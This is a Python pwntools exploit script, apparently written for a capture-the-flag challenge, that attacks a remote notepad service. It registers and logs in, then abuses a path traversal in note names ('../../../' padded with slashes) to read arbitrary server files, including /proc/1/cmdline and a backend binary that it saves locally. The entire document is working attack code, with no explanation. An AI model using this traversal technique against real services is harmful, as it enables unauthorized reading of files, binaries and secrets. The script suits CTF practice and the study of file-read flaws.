from pwn import *

context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
init_port = sys.argv[1]
# r = process('./share/notepad')
r = remote('10.113.184.121', init_port)

def Login(username, password):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('Username: ')
    r.sendline(username)
    r.recvuntil('Password: ')
    r.sendline(password)

def Register(username, password):
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('Username: ')
    r.sendline(username)
    r.recvuntil('Password: ')
    r.sendline(password)
    
def NewNote(note_name, content_length, content):
    r.recvuntil('> ')
    r.sendline('3')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Content Length: ', content_length)
    r.sendlineafter('Content: ', content)
    
def EditNoteName(name, offset, length, content):
    r.recvuntil('> ')
    r.sendline('4')
    r.sendlineafter('Note Name: ', name)
    r.sendlineafter('Offset: ', offset)
    r.sendlineafter('Content Length: ', length)
    r.sendlineafter('Content: ', content)

def ShowNote(note_name, offset):
    r.recvuntil('> ')
    r.sendline('5')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Offset: ', offset)
    res = r.recv(128).decode().strip()
    return res

def ShowNote_backend(note_name, offset):
    r.recvuntil('> ')
    r.sendline('5')
    r.sendlineafter('Note Name: ', note_name)
    r.sendlineafter('Offset: ', offset)
    res = r.recv(128)
    return res

def find_backend(file_name):
    payload = b'../../../' + b'/' * (98 - len(file_name)) + file_name
    print(len(payload))
    offset = 0
    res = ShowNote(payload, str(offset).encode())
    if res != b'Read note failed.' and res != b"Couldn't open the file.":
        print(res)
        return 1

def read_file(file_name):
    payload = b'../../../' + b'/' * (98 - len(file_name)) + file_name
    offset = 0
    print(len(payload))
    ret = b''
    while(True):
        res = ShowNote_backend(payload, str(offset).encode())
        if res != b'Read note failed.' and res != b"Couldn't open the file.":
            ret += res
            offset += 128
        else:
            if offset == 0:
                print("Failed!!!")
            else:
                print("Success!!!")
            break
    return ret

# Register & Login
Register('admin', 'admin')
Login('admin', 'admin')

# Backend PID is 1
log.info('Find backend PID 1...')
file = b'/proc/' + str(1).encode() + b'/cmdline'
find_backend(file)

# read ./backend_4050c20b6ca4118b63acd960cd1b9cd8 content to ./backend
f = open('./backend', 'wb')
file = b'/home/notepad/backend_4050c20b6ca4118b63acd960cd1b9cd8'
f.write(read_file(file))